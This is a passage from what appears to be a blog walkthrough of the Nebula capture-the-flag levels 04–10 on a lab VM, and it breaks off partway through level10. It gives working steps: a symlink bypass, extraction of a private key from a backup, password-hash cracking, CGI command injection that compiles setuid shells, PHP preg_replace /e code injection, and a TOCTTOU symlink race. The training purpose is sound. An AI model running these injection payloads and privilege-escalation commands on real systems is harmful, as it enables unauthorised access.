</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;sys/types.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;fcntl.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e></span>
<span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>argv, <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>envp)
{
  <span style=color:#66d9ef>char</span> buf[<span style=color:#ae81ff>1024</span>];
  <span style=color:#66d9ef>int</span> fd, rc;

  <span style=color:#66d9ef>if</span>(argc <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span>) {
      printf(<span style=color:#e6db74>&#34;%s [file to read]</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, argv[<span style=color:#ae81ff>0</span>]);
      exit(EXIT_FAILURE);
  }

  <span style=color:#66d9ef>if</span>(strstr(argv[<span style=color:#ae81ff>1</span>], <span style=color:#e6db74>&#34;token&#34;</span>) <span style=color:#f92672>!=</span> NULL) {
      printf(<span style=color:#e6db74>&#34;You may not access &#39;%s&#39;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, argv[<span style=color:#ae81ff>1</span>]);
      exit(EXIT_FAILURE);
  }

  fd <span style=color:#f92672>=</span> open(argv[<span style=color:#ae81ff>1</span>], O_RDONLY);
  <span style=color:#66d9ef>if</span>(fd <span style=color:#f92672>==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>) {
      err(EXIT_FAILURE, <span style=color:#e6db74>&#34;Unable to open %s&#34;</span>, argv[<span style=color:#ae81ff>1</span>]);
  }

  rc <span style=color:#f92672>=</span> read(fd, buf, <span style=color:#66d9ef>sizeof</span>(buf));

  <span style=color:#66d9ef>if</span>(rc <span style=color:#f92672>==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>) {
      err(EXIT_FAILURE, <span style=color:#e6db74>&#34;Unable to read fd %d&#34;</span>, fd);
  }

  write(<span style=color:#ae81ff>1</span>, buf, rc);
}
</code></pre></div><p>From the snippet we can see that a check is in place for the first argument to see if the string <code>token</code> exists in it. As the token we want to read is actually called <em>token</em> this check will obviously prevent us from reading it. As we also don’t have write access to the file we cant rename it either. We can however make a symlink to it with a different name, thereby circumventing this check.</p>
<p>So, to solve level04:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>level04@nebula:/home/flag04$ ln -s /home/flag04/token /var/tmp/flag04
level04@nebula:/home/flag04$ ./flag04 /var/tmp/flag04
06508b5e-8909-4f38-b630-fdb148a848a2

level04@nebula:/home/flag04$ su - flag04
Password:
flag04@nebula:~$ getflag
You have successfully executed getflag on a target account
</code></pre></div><h2 id=level05>level05<a hidden class=anchor aria-hidden=true href=#level05>#</a></h2>
<p><a href=https://exploit-exercises.com/nebula/level05/>Level05&rsquo;s Description</a>:</p>
<blockquote>
<p>Check the flag05 home directory. You are looking for weak directory permissions</p>
</blockquote>
<p>Browsing to the <code>flag05</code> directory we can see a <code>.backup</code> directory containing a tar archive that is readable. This archive contained a private key that allowed login as the <code>flag05</code> user.</p>
<p>So, to solve level05:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>level05@nebula:~$ cd ~flag05
level05@nebula:/home/flag05$ ls -lah
total 5.0K
drwxr-x--- <span style=color:#ae81ff>4</span> flag05 level05   <span style=color:#ae81ff>93</span> 2012-08-18 06:56 .
drwxr-xr-x <span style=color:#ae81ff>1</span> root   root     <span style=color:#ae81ff>220</span> 2012-08-27 07:18 ..
drwxr-xr-x <span style=color:#ae81ff>2</span> flag05 flag05    <span style=color:#ae81ff>42</span> 2011-11-20 20:13 .backup
-rw-r--r-- <span style=color:#ae81ff>1</span> flag05 flag05   <span style=color:#ae81ff>220</span> 2011-05-18 02:54 .bash_logout
-rw-r--r-- <span style=color:#ae81ff>1</span> flag05 flag05  3.3K 2011-05-18 02:54 .bashrc
-rw-r--r-- <span style=color:#ae81ff>1</span> flag05 flag05   <span style=color:#ae81ff>675</span> 2011-05-18 02:54 .profile
drwx------ <span style=color:#ae81ff>2</span> flag05 flag05    <span style=color:#ae81ff>70</span> 2011-11-20 20:13 .ssh

level05@nebula:/home/flag05$ cd .backup/
level05@nebula:/home/flag05/.backup$ ls -lah
total 2.0K
drwxr-xr-x <span style=color:#ae81ff>2</span> flag05 flag05    <span style=color:#ae81ff>42</span> 2011-11-20 20:13 .
drwxr-x--- <span style=color:#ae81ff>4</span> flag05 level05   <span style=color:#ae81ff>93</span> 2012-08-18 06:56 ..
-rw-rw-r-- <span style=color:#ae81ff>1</span> flag05 flag05  1.8K 2011-11-20 20:13 backup-19072011.tgz

level05@nebula:/home/flag05/.backup$ tar -xvf backup-19072011.tgz -C /var/tmp/
.ssh/
.ssh/id_rsa.pub
.ssh/id_rsa
.ssh/authorized_keys

level05@nebula:/home/flag05/.backup$ ssh -i /var/tmp/.ssh/id_rsa flag05@127.0.0.1
The authenticity of host <span style=color:#e6db74>&#39;127.0.0.1 (127.0.0.1)&#39;</span> can<span style=color:#e6db74>&#39;t be established.
</span><span style=color:#e6db74>ECDSA key fingerprint is ea:8d:09:1d:f1:69:e6:1e:55:c7:ec:e9:76:a1:37:f0.
</span><span style=color:#e6db74>Are you sure you want to continue connecting (yes/no)? yes
</span><span style=color:#e6db74>Warning: Permanently added &#39;</span>127.0.0.1<span style=color:#960050;background-color:#1e0010>&#39;</span> <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span> to the list of known hosts.

<span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>

flag05@nebula:~$ getflag
You have successfully executed getflag on a target account
</code></pre></div><h2 id=level06>level06<a hidden class=anchor aria-hidden=true href=#level06>#</a></h2>
<p><a href=https://exploit-exercises.com/nebula/level05/>Level06&rsquo;s Description</a>:</p>
<blockquote>
<p>The flag06 account credentials came from a legacy unix system.</p>
</blockquote>
<p>Legacy unix system? This immediately had me thinking that the password hash may be in <code>/etc/passwd</code>. Older unix systems used to store passwords this way, but that is no longer the case.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>level06@nebula:~$ cat /etc/passwd| grep flag06
flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh
</code></pre></div><p>The hash <code>ueqwOCnSGdsuM</code> is something that I had to send to <code>john</code> to crack. So I just copied it over to a Kali linux instance and attempted to crack it with brute force. It took a few micro seconds to crack :P</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>~ <span style=color:#75715e># cat hash</span>
ueqwOCnSGdsuM

~ <span style=color:#75715e># john hash</span>
Loaded <span style=color:#ae81ff>1</span> password hash <span style=color:#f92672>(</span>Traditional DES <span style=color:#f92672>[</span>128/128 BS SSE2<span style=color:#f92672>])</span>
hello            <span style=color:#f92672>(</span>?<span style=color:#f92672>)</span>
guesses: <span style=color:#ae81ff>1</span>  time: 0:00:00:00 DONE <span style=color:#f92672>(</span>Fri May  <span style=color:#ae81ff>8</span> 17:29:20 2015<span style=color:#f92672>)</span>  c/s: <span style=color:#ae81ff>102400</span>  trying: <span style=color:#ae81ff>123456</span> - Pyramid
Use the <span style=color:#e6db74>&#34;--show&#34;</span> option to display all of the cracked passwords reliably
</code></pre></div><p>The password is <code>hello</code>.
So, to solve level06:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>level06@nebula:~$ su - flag06
Password:
flag06@nebula:~$ getflag
You have successfully executed getflag on a target account
</code></pre></div><h2 id=level07>level07<a hidden class=anchor aria-hidden=true href=#level07>#</a></h2>
<p><a href=https://exploit-exercises.com/nebula/level07/>Level07&rsquo;s Description</a>:</p>
<blockquote>
<p>The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.</p>
</blockquote>
<p>With the description we are provided with the source code of a small Perl program:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-perl data-lang=perl><span style=color:#75715e>#!/usr/bin/perl</span>

<span style=color:#66d9ef>use</span> CGI <span style=color:#e6db74>qw{param}</span>;

<span style=color:#66d9ef>print</span> <span style=color:#e6db74>&#34;Content-type: text/html\n\n&#34;</span>;

<span style=color:#66d9ef>sub</span> <span style=color:#a6e22e>ping</span> {
  $host <span style=color:#f92672>=</span> $_[<span style=color:#ae81ff>0</span>];

  <span style=color:#66d9ef>print</span>(<span style=color:#e6db74>&#34;&lt;html&gt;&lt;head&gt;&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;&#34;</span>);

  @output <span style=color:#f92672>=</span> <span style=color:#e6db74>`ping -c 3 $host 2&gt;&amp;1`</span>;
  <span style=color:#66d9ef>foreach</span> $line (@output) { <span style=color:#66d9ef>print</span> <span style=color:#e6db74>&#34;$line&#34;</span>; }

  <span style=color:#66d9ef>print</span>(<span style=color:#e6db74>&#34;&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;&#34;</span>);

}

<span style=color:#75715e># check if Host set. if not, display normal page, etc</span>

ping(param(<span style=color:#e6db74>&#34;Host&#34;</span>));
</code></pre></div><p>This script has a very obvious command injection problem in the ping command. It also looks like something that should be served by a web server. In the <code>flag07</code> directory one can see a <code>thttpd.conf</code> file which contains the port of the webserver serving this script on.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>level07@nebula:/home/flag07$ grep port thttpd.conf
<span style=color:#75715e># Specifies an alternate port number to listen on.</span>
port<span style=color:#f92672>=</span><span style=color:#ae81ff>7007</span>
<span style=color:#75715e># all hostnames supported on the local machine. See thttpd(8) for details.</span>
</code></pre></div><p>Exploiting the vulnerability simply meant that we have to inject commands into the <code>Host</code> parameter. I normally use python&rsquo;s urllib to ensure that fields are properly url encoded etc.</p>
<p>So, to solve level07:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>~ » curl -v <span style=color:#e6db74>&#34;http://192.168.217.239:7007/index.cgi?</span><span style=color:#66d9ef>$(</span>python -c <span style=color:#e6db74>&#39;import urllib; print urllib.urlencode({ &#34;Host&#34; : &#34;127.0.0.1 &amp;&amp; gcc /var/tmp/shell.c -o /var/tmp/flag07 &amp;&amp; chmod 4777 /var/tmp/flag07&#34; })&#39;</span><span style=color:#66d9ef>)</span><span style=color:#e6db74>&#34;</span>
* Hostname was NOT found in DNS cache
*   Trying 192.168.217.239...
* Connected to 192.168.217.239 <span style=color:#f92672>(</span>192.168.217.239<span style=color:#f92672>)</span> port <span style=color:#ae81ff>7007</span> <span style=color:#f92672>(</span><span style=color:#75715e>#0)</span>
&gt; GET /index.cgi?Host<span style=color:#f92672>=</span>127.0.0.1+%26%26+gcc+%2Fvar%2Ftmp%2Fshell.c+-o+%2Fvar%2Ftmp%2Fflag07+%26%26+chmod+4777+%2Fvar%2Ftmp%2Fflag07 HTTP/1.1
&gt; User-Agent: curl/7.37.1
&gt; Host: 192.168.217.239:7007
&gt; Accept: */*
&gt;
* HTTP 1.0, assume close after body
&lt; HTTP/1.0 <span style=color:#ae81ff>200</span> OK
&lt; Content-type: text/html
&lt;
&lt;html&gt;&lt;head&gt;&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;PING 127.0.0.1 <span style=color:#f92672>(</span>127.0.0.1<span style=color:#f92672>)</span> 56<span style=color:#f92672>(</span>84<span style=color:#f92672>)</span> bytes of data.
<span style=color:#ae81ff>64</span> bytes from 127.0.0.1: icmp_req<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> ttl<span style=color:#f92672>=</span><span style=color:#ae81ff>64</span> time<span style=color:#f92672>=</span>0.011 ms
<span style=color:#ae81ff>64</span> bytes from 127.0.0.1: icmp_req<span style=color:#f92672>=</span><span style=color:#ae81ff>2</span> ttl<span style=color:#f92672>=</span><span style=color:#ae81ff>64</span> time<span style=color:#f92672>=</span>0.023 ms
<span style=color:#ae81ff>64</span> bytes from 127.0.0.1: icmp_req<span style=color:#f92672>=</span><span style=color:#ae81ff>3</span> ttl<span style=color:#f92672>=</span><span style=color:#ae81ff>64</span> time<span style=color:#f92672>=</span>0.022 ms

--- 127.0.0.1 ping statistics ---
<span style=color:#ae81ff>3</span> packets transmitted, <span style=color:#ae81ff>3</span> received, 0% packet loss, time 1998ms
rtt min/avg/max/mdev <span style=color:#f92672>=</span> 0.011/0.018/0.023/0.007 ms
* Closing connection <span style=color:#ae81ff>0</span>
&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;
</code></pre></div><p>And finally back on the NebulaVM after this curl from my host:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>level07@nebula:/home/flag07$ /var/tmp/flag07
sh-4.2$ getflag
You have successfully executed getflag on a target account
</code></pre></div><h2 id=level08>level08<a hidden class=anchor aria-hidden=true href=#level08>#</a></h2>
<p><a href=https://exploit-exercises.com/nebula/level08/>Level08&rsquo;s Description</a>:</p>
<blockquote>
<p>World readable files strike again. Check what that user was up to, and use it to log into flag08 account.</p>
</blockquote>
<p>Logging in as the user <code>level08</code> reveals a pcap in the <code>flag08</code> directory:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>level08@nebula:~$ cd ~flag08
level08@nebula:/home/flag08$ ls
capture.pcap

level08@nebula:/home/flag08$ file capture.pcap
capture.pcap: tcpdump capture file <span style=color:#f92672>(</span>little-endian<span style=color:#f92672>)</span> - version 2.4 <span style=color:#f92672>(</span>Ethernet, capture length 65535<span style=color:#f92672>)</span>
</code></pre></div><p>I copied the pcap off the box and opened it on my Kali Linux VM with wireshark to investigate:</p>
<figure>
<img loading=lazy src=/images/nebula_level8_pcap.png>
</figure>
<p>Here we can see some data that got captured in clear text. It looks like a telnet session where someone was logging in with the <code>level8</code> account. The password though has a few dots in it. To make more sense of these, I switched the stream view to hex so that we can try see the ASCII codes of the keypresses.</p>
<figure>
<img loading=lazy src=/images/nebula_level8_tcp_stream.png>
</figure>
<p><code>F7</code> according to the ASCII table is a backspace. That makes this easy :) Considering we have the password <code>backdoor...00Rm8.ate</code>, substituting the dot with backspaces we end up with <code>backd00Rmate</code> as the password.</p>
<p>So, to solve level08:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>level08@nebula:/home/flag08$ su - flag08
Password:

flag08@nebula:~$ getflag
You have successfully executed getflag on a target account
</code></pre></div><h2 id=level09>level09<a hidden class=anchor aria-hidden=true href=#level09>#</a></h2>
<p><a href=https://exploit-exercises.com/nebula/level09/>Level09&rsquo;s Description</a>:</p>
<blockquote>
<p>There’s a C setuid wrapper for some vulnerable PHP code…</p>
</blockquote>
<p>With the description we are provided with the source code of a small PHP program:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>

<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>spam</span>($email)
{
  $email <span style=color:#f92672>=</span> <span style=color:#a6e22e>preg_replace</span>(<span style=color:#e6db74>&#34;/\./&#34;</span>, <span style=color:#e6db74>&#34; dot &#34;</span>, $email);
  $email <span style=color:#f92672>=</span> <span style=color:#a6e22e>preg_replace</span>(<span style=color:#e6db74>&#34;/@/&#34;</span>, <span style=color:#e6db74>&#34; AT &#34;</span>, $email);

  <span style=color:#66d9ef>return</span> $email;
}

<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>markup</span>($filename, $use_me)
{
  $contents <span style=color:#f92672>=</span> <span style=color:#a6e22e>file_get_contents</span>($filename);

  $contents <span style=color:#f92672>=</span> <span style=color:#a6e22e>preg_replace</span>(<span style=color:#e6db74>&#34;/(\[email (.*)\])/e&#34;</span>, <span style=color:#e6db74>&#34;spam(</span><span style=color:#ae81ff>\&#34;\\</span><span style=color:#e6db74>2</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>)&#34;</span>, $contents);
  $contents <span style=color:#f92672>=</span> <span style=color:#a6e22e>preg_replace</span>(<span style=color:#e6db74>&#34;/\[/&#34;</span>, <span style=color:#e6db74>&#34;&lt;&#34;</span>, $contents);
  $contents <span style=color:#f92672>=</span> <span style=color:#a6e22e>preg_replace</span>(<span style=color:#e6db74>&#34;/\]/&#34;</span>, <span style=color:#e6db74>&#34;&gt;&#34;</span>, $contents);

  <span style=color:#66d9ef>return</span> $contents;
}

$output <span style=color:#f92672>=</span> <span style=color:#a6e22e>markup</span>($argv[<span style=color:#ae81ff>1</span>], $argv[<span style=color:#ae81ff>2</span>]);

<span style=color:#66d9ef>print</span> $output;

<span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></code></pre></div><p>In the <code>flag09</code> directory, we have the above PHP sample as well as a SUID binary.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>level09@nebula:~$ cd ~flag09
level09@nebula:/home/flag09$ ls -lh
total 8.0K
-rwsr-x--- <span style=color:#ae81ff>1</span> flag09 level09 7.1K 2011-11-20 21:22 flag09
-rw-r--r-- <span style=color:#ae81ff>1</span> root   root     <span style=color:#ae81ff>491</span> 2011-11-20 21:22 flag09.php
</code></pre></div><p>At first I managed to solve this one really fast. When <code>flag09</code> is invoked with <code>-h</code>, it seemed like it passed the arguments directly to a PHP binary. So, I was able to drop into an interactive PHP shell and execute commands from there:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>level09@nebula:/home/flag09$ ./flag09 -a
Interactive shell

php &gt; system<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;id&#34;</span><span style=color:#f92672>)</span>;
uid<span style=color:#f92672>=</span>1010<span style=color:#f92672>(</span>level09<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1010<span style=color:#f92672>(</span>level09<span style=color:#f92672>)</span> euid<span style=color:#f92672>=</span>990<span style=color:#f92672>(</span>flag09<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>990<span style=color:#f92672>(</span>flag09<span style=color:#f92672>)</span>,1010<span style=color:#f92672>(</span>level09<span style=color:#f92672>)</span>
</code></pre></div><p>With this I would have been able to prepare the small <code>flag09</code> setuid shell and complete the level. However, I did not think this was the intended route so I continued to investigate the PHP program further.</p>
<p>The PHP code basically had 2 main functions. <code>markup()</code> and <code>spam()</code>. <code>markup()</code> would read the contents of a file (who’s location is read as the first command line argument), and using regex, search for a pattern matching <code>[email addr]</code> where <em>addr</em> will be the extracted part. It then as a callback executes <code>spam()</code> which will convert <code>.</code> to <code>dot</code> and <code>@</code> to <code>AT</code>. I took a really long time researching the <code>preg_replace()</code> functions and potential exploits with it. Eventually I came across a post describing how code injection may be possible when <code>preg_replace()</code> is called with the <code>e</code> modifier. <a href=http://www.madirish.net/402>This</a> blogpost explains the vulnerability in pretty great detail. That blogpost coupled with the PHP docs <a href=http://php.net/manual/en/reference.pcre.pattern.modifiers.php>here</a> helps develop a payload for exploitation. The PHP documentation has a sample of <code>&lt;h1>{${eval($_GET[php_code])}}&lt;/h1></code> which is what I used to finish the final payload for this level.</p>
<p>Another thing to note about the PHP code is the <code>$use_me</code> variable passed to the <code>markup()</code> function. It only gets declared and never gets used later. I think the developer of this level wanted this to be a form of hint, but it was handy to get code execution as argument 2 on the command line will be the command we want to execute :)</p>
<p>So, to solve level09:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>level09@nebula:/home/flag09$ echo -ne <span style=color:#e6db74>&#34;[email {\${system(\$use_me)}}]&#34;</span> &gt; /var/tmp/flag09.txt

level09@nebula:/home/flag09$ cat /var/tmp/flag09.txt
<span style=color:#f92672>[</span>email <span style=color:#f92672>{</span><span style=color:#e6db74>${</span>system($use_me)<span style=color:#e6db74>}</span><span style=color:#f92672>}]</span>

level09@nebula:/home/flag09$ ./flag09 /var/tmp/flag09.txt <span style=color:#e6db74>&#34;gcc /var/tmp/shell.c -o /var/tmp/flag09; chmod 4777 /var/tmp/flag09&#34;</span>
PHP Notice:  Undefined variable:  in /home/flag09/flag09.php<span style=color:#f92672>(</span>15<span style=color:#f92672>)</span> : regexp code on line <span style=color:#ae81ff>1</span>

level09@nebula:/home/flag09$ /var/tmp/flag09
sh-4.2$ getflag
You have successfully executed getflag on a target account
</code></pre></div><h3 id=intermission>intermission<a hidden class=anchor aria-hidden=true href=#intermission>#</a></h3>
<p>From here, the levels became noticeably harder for me. A lot of the levels had me researching new things that I was unsure of. :)</p>
<p>I wont detail all of the failed attempts. There were so many. Only the successes (and if a failure was significant) will land here :P
Lets get to them!</p>
<h2 id=level10>level10<a hidden class=anchor aria-hidden=true href=#level10>#</a></h2>
<p><a href=https://exploit-exercises.com/nebula/level10/>Level10&rsquo;s Description</a>:</p>
<blockquote>
<p>The setuid binary at /home/flag10/flag10 binary will upload any file given, as long as it meets the requirements of the access() system call.</p>
</blockquote>
<p>With the description we are provided with the source code of a small PHP program:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;sys/types.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;fcntl.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;errno.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;sys/socket.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;netinet/in.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e></span>
<span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>argv)
{
  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>file;
  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>host;

  <span style=color:#66d9ef>if</span>(argc <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>3</span>) {
      printf(<span style=color:#e6db74>&#34;%s file host</span><span style=color:#ae81ff>\n\t</span><span style=color:#e6db74>sends file to host if you have access to it</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, argv[<span style=color:#ae81ff>0</span>]);
      exit(<span style=color:#ae81ff>1</span>);
  }

  file <span style=color:#f92672>=</span> argv[<span style=color:#ae81ff>1</span>];
  host <span style=color:#f92672>=</span> argv[<span style=color:#ae81ff>2</span>];

  <span style=color:#66d9ef>if</span>(access(argv[<span style=color:#ae81ff>1</span>], R_OK) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
      <span style=color:#66d9ef>int</span> fd;
      <span style=color:#66d9ef>int</span> ffd;
      <span style=color:#66d9ef>int</span> rc;
      <span style=color:#66d9ef>struct</span> sockaddr_in sin;
      <span style=color:#66d9ef>char</span> buffer[<span style=color:#ae81ff>4096</span>];

      printf(<span style=color:#e6db74>&#34;Connecting to %s:18211 .. &#34;</span>, host); fflush(stdout);

      fd <span style=color:#f92672>=</span> socket(AF_INET, SOCK_STREAM, <span style=color:#ae81ff>0</span>);

      memset(<span style=color:#f92672>&amp;</span>sin, <span style=color:#ae81ff>0</span>, <span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>struct</span> sockaddr_in));
      sin.sin_family <span style=color:#f92672>=</span> AF_INET;
      sin.sin_addr.s_addr <span style=color:#f92672>=</span> inet_addr(host);
      sin.sin_port <span style=color:#f92672>=</span> htons(<span style=color:#ae81ff>18211</span>);

      <span style=color:#66d9ef>if</span>(connect(fd, (<span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>sin, <span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>struct</span> sockaddr_in)) <span style=color:#f92672>==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>) {
          printf(<span style=color:#e6db74>&#34;Unable to connect to host %s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, host);
          exit(EXIT_FAILURE);
      }

<span style=color:#75715e>#define HITHERE &#34;.oO Oo.\n&#34;
</span><span style=color:#75715e></span>      <span style=color:#66d9ef>if</span>(write(fd, HITHERE, strlen(HITHERE)) <span style=color:#f92672>==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>) {
          printf(<span style=color:#e6db74>&#34;Unable to write banner to host %s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, host);
          exit(EXIT_FAILURE);
      }
<span style=color:#75715e>#undef HITHERE
</span><span style=color:#75715e></span>
      printf(<span style=color:#e6db74>&#34;Connected!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>Sending file .. &#34;</span>); fflush(stdout);

      ffd <span style=color:#f92672>=</span> open(file, O_RDONLY);
      <span style=color:#66d9ef>if</span>(ffd <span style=color:#f92672>==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>) {
          printf(<span style=color:#e6db74>&#34;Damn. Unable to open file</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
          exit(EXIT_FAILURE);
      }

      rc <span style=color:#f92672>=</span> read(ffd, buffer, <span style=color:#66d9ef>sizeof</span>(buffer));
      <span style=color:#66d9ef>if</span>(rc <span style=color:#f92672>==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>) {
          printf(<span style=color:#e6db74>&#34;Unable to read from file: %s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, strerror(errno));
          exit(EXIT_FAILURE);
      }

      write(fd, buffer, rc);

      printf(<span style=color:#e6db74>&#34;wrote file!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);

  } <span style=color:#66d9ef>else</span> {
      printf(<span style=color:#e6db74>&#34;You don&#39;t have access to %s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, file);
  }
}
</code></pre></div><p>As the description has it, this program seems to read a file and send its contents to a user specified IP address on tcp/18211. I tested this by opening a netcat listener with <code>nc -lk 18211</code> and sending myself a file to see what comes out. Obviously, I was not able to send the token that was in the same directory as the <code>flag10</code> binary as I did not have read access to this.</p>
<p>The problem with this program through is the fact that it checks if the file can be read using <code>access()</code>, then only later opens it using <code>open()</code>. Using this method it may be possible to change out the file before it hits the <code>open()</code> method. Symlinks are the goto for this kind of problem as they can be easily swapped out by relinking a file as the program runs. It of course helps that the file to read can be user specified. There is actually an acronym for this kind of bug called <a href=http://en.wikipedia.org/wiki/Time_of_check_to_time_of_use>TOCTTOU</a>. The Wikipedia article describes almost exactly the same scenario as we have here.</p>
<p>My plan of attack was to create a race condition. I would create an infinite loop that relinks a file from something I can actually read back to the token file and vice versa. While this continuous relinking occurs, I would run the affected binary, hoping that we would catch a case where the link swaps out as hoped for sending the token contents to my netcat listener. To increase my chances of the race condition occurring, I put the <code>flag10</code> binary in its own loop as well.</p>
<p>So, to solve level10:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>level10@nebula:/home/flag10$ <span style=color:#66d9ef>while</span> true; <span style=color:#66d9ef>do</span> ln -sf /var/tmp/shell.c /var/tmp/flag10-token; ln -sf /home/flag10/token /var/tmp/flag10-token; <span style=color:#66d9ef>done</span> &amp;
<span style=color:#f92672>[</span>1<span style=color:#f92672>]</span> <span style=color:#ae81ff>14219</span>

